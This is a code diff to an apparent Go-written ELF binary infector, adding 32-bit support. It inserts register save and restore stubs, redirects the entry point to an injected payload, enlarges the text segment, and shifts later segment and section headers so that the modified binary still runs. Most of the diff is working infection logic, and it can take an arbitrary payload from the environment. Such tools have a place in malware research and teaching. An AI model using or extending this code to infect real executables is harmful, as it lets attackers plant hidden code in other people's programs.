@@ -113,6 +113,10 @@ var defaultPayload64 = []byte{
 	0x0f, 0x05, //syscall
 }
 
+var preserve32 = []byte{0x60} //pusha
+
+var restoration32 = []byte{0x61} //popa
+
 var defaultPayload32 = []byte{
 	0xeb, 0x00, //jmp    8049002 <message>
 	//08049002 <message>:
@@ -258,7 +262,79 @@ func (t *targetBin) infectBinary(debug bool) error {
 		}
 
 	case elf.ELFCLASS32:
-		return errors.New("Infection for 32-bit not supported yet")
+		oEntry := t.Hdr.(*elf.Header32).Entry
+		oShoff = t.Hdr.(*elf.Header32).Shoff
+
+		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
+		pHeaders := t.Phdrs.([]elf.Prog32)
+		pNum := int(t.Hdr.(*elf.Header32).Phnum)
+
+		for i := 0; i < pNum; i++ {
+			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
+				textNdx = i
+				t.Hdr.(*elf.Header32).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
+				if debug {
+					fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
+				}
+
+				textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
+				if debug {
+					fmt.Printf(TEXT_SEG_START, pHeaders[i].Off)
+					fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
+					fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
+				}
+
+				t.Payload.Write(restoration32)
+				retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
+				t.Payload.Write(retStub)
+
+				if debug {
+					fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
+					printPayload(t.Payload.Bytes())
+				}
+
+				t.Phdrs.([]elf.Prog32)[i].Memsz += uint32(t.Payload.Len())
+				t.Phdrs.([]elf.Prog32)[i].Filesz += uint32(t.Payload.Len())
+
+				if debug {
+					fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
+					fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
+				}
+			}
+		}
+
+		if debug {
+			fmt.Println(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
+		}
+
+		for j := textNdx; j < pNum; j++ {
+			if pHeaders[textNdx].Off < pHeaders[j].Off {
+				if debug {
+					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
+				}
+				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
+			}
+		}
+
+		if debug {
+			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
+		}
+		sectionHdrTable := t.Shdrs.([]elf.Section32)
+		sNum := int(t.Hdr.(*elf.Header32).Shnum)
+
+		for k := 0; k < sNum; k++ {
+			if sectionHdrTable[k].Off >= textSegEnd.(uint32) {
+				if debug {
+					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
+				}
+				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
+			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
+				if debug {
+					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
+				}
+				t.Shdrs.([]elf.Section32)[k].Size += uint32(t.Payload.Len())
+			}
+		}
 	}
 
 	infected := new(bytes.Buffer)
@@ -314,7 +390,8 @@ func (t *targetBin) infectBinary(debug bool) error {
 		copy(finalInfection[int(oShoff.(uint64)):], infectedShdrTable.Bytes())
 		endOfInfection = int(textSegEnd.(uint64))
 	case elf.ELFCLASS32:
-		fmt.Println("not implemented yet")
+		copy(finalInfection[int(oShoff.(uint32)):], infectedShdrTable.Bytes())
+		endOfInfection = int(textSegEnd.(uint32))
 	}
 
 	copy(finalInfectionTwo, finalInfection[:endOfInfection])
@@ -484,8 +561,7 @@ func main() {
 	case elf.ELFCLASS64:
 		t.Payload.Write(preserve64)
 	case elf.ELFCLASS32:
-		fmt.Println("32-bit not supported yet")
-		return
+		t.Payload.Write(preserve32)
 	}
 
 	switch {
@@ -498,8 +574,7 @@ func main() {
 		if t.EIdent.Arch == elf.ELFCLASS64 {
 			t.Payload.Write(defaultPayload64)
 		} else {
-			fmt.Println("No support for 32-bit payloads yet.")
-			return
+			t.Payload.Write(defaultPayload32)
 		}
 
 	case *pEnv != "":
